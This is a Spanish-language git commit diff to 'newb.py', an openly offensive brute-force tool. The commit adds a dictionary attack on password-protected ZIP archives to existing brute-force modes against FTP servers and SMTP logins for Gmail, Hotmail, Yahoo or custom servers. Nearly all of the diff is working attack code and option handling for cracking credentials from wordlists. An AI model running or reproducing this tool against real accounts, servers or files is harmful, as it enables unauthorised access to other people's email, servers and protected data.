fca8c95068befdc6b0346c0c4720bfdd101ca7bc
binarioGH <lacuentafalsadediegojonas@gmail.com>
2018-06-15 21:36:39 -0500

    Nueva función para atacar archivos.zip

--- newb.py
+++ newb.py
@@ -4,7 +4,23 @@ from sys import argv
 from ftplib import FTP 
 from time import sleep
 from smtplib import SMTP
+import zipfile
 
+
+def bforcezip(zipf, passwords):
+	try:
+		zf = zipfile.ZipFile(zipf)
+	except Exception as e:
+		print("Problemas al abrir '{}'\n{}".format(zipf, e))
+		exit()
+	for password in passwords:
+		try:
+			zf.extractall(pwd=password)
+		except:
+			print("'{}' no es la contraseña del archivo.".format(password))
+		else:
+			print("'{}' es la contraseña de {}.".format(password, zf))
+			exit()
 def bforcemail(users, passwords, server):
 	server = SMTP(server)
 	server.starttls()
@@ -59,15 +75,16 @@ def listaupf(lista, count):
 
 def h():
 	print("\nOpciones:")
-	print("\nSe debe de especificar que servicio se va a atacar:\nftp o mail.")
-	print("\nmail: --mail\nftp: --ftp\n\nLas banderas que se pueden usar en los 2 prametros:")
-	print("\n-u:  Se usa para establecer con que usuario ingresar.\n-uf: Establecer diccionario de usuarios.")
+	print("\nSe debe de especificar que se va a atacar:\nftp, smtp o un archivo.zip.")
+	print("\nmail: --mail\nftp: --ftp\n--zip\n\nLas banderas que se pueden usar en los 3 prametros:")
+	print("\n-u:  Se usa para establecer con que usuario ingresar (no sirve para el modo --zip).\n-uf: Establecer diccionario de usuarios (no sirve para el modo --zip).")
 	print("-p:  Sirve para establecer una contraseña.\n-pf: Establecer diccionario de contraseñas.")
 	#print("-t:  Sirve para establecer el tiempo entre cada intento.")
 	print("\nSolo hay una bandera exclusiva para ftp:\n\n-hst:  Sirve para establecer la dirección del servidor.")
 	print("\nBanderas para --mail:")
 	print("\n\nSi se usa --mail debe usarse -gm, -hm o -yh, para escoger gmail, hotmail o yahoo.")
 	print("Tambien puedes usar -o para escoger tu propio servidor smtp:\n-o dominiosmtp:puerto .")
+	print("\n--zip:\n-file: Determinar la ruta del archivo.zip.")
 
 if __name__ == '__main__':
 	if len(argv) == 1:
@@ -79,26 +96,28 @@ if __name__ == '__main__':
 		passwordlist = []
 		ip = str()
 		argcount = 1
+		fl = str()
 		#time = 5
 		ftp, mail = False, False
 		options = {"gm": False, "hm": False, "yh": False, "o": False}
-		#gm, hm, yh = False, False, False
+		mainopt = {"mail": False, "ftp": False, "zip":False}
 		for arg in argv[1:]:
 			if arg[0] != "-":
 				argcount += 1
 				continue
 			if arg == "--ftp":
-				ftp = True
+				mainopt["ftp"] = True
+				argcount += 1
+				continue
+			elif arg == "--zip":
+				mainopt["zip"] = True
 				argcount += 1
 				continue
 			elif arg == "--mail":
-				mail = True
+				mainopt["mail"] = True
 				srv = str()
 				argcount += 1
 				continue
-			if ftp == True and mail == True:
-				print("No se puede usar las banderas --ftp y --mail al mismo tiempo")
-				exit()
 			if arg == "-uf":
 				listaupf(userslist, argcount)
 			elif arg == "-u":
@@ -121,6 +140,8 @@ if __name__ == '__main__':
 			elif arg == "-o":
 				srv = argv[argcount + 1]
 				options["o"] = True
+			elif arg == "-file":
+				fl = argv[argcount + 1]
 			else:
 				print("No se reconoce '{}' como una bandera.".format(arg))
 				exit()
@@ -132,16 +153,26 @@ if __name__ == '__main__':
 				if optcount > 1:
 					print("No se puede usar 2 servidores smtp al mismo tiempo.")
 					exit()
-			
-		
+			optcount = 0
+			for option in mainopt:
+				if mainopt[option] == True:
+					optcount += 1
+				if optcount > 1:
+					print("No se puede usar más de una función al mismo tiempo.")
+					exit()
 			
 		if ftp == True and ip == "":
 			print("para usar --ftp se ocupa determinar una ip:\n-hst (ip del servidor ftp)")
 			exit()
-		elif ftp == True:
+		elif mainopt["ftp"] == True:
 			bforceftp(userslist, passwordlist, ip, time)
-		elif mail == True and srv != "":
+		elif mainopt["mail"] == True and srv != "":
 			bforcemail(userslist, passwordlist, srv)
-		elif mail == True and srv == "":
+		elif mainopt	["mail"] == True and srv == "":
 			print("No se ha elegido un servidor smtp.")
+			exit()
+		elif mainopt["zip"] == True and fl != "":
+			bforcezip(fl, passwordlist)
+		else:
+			print("No se ha establecido un archivo al cual atacar.")
 			exit()
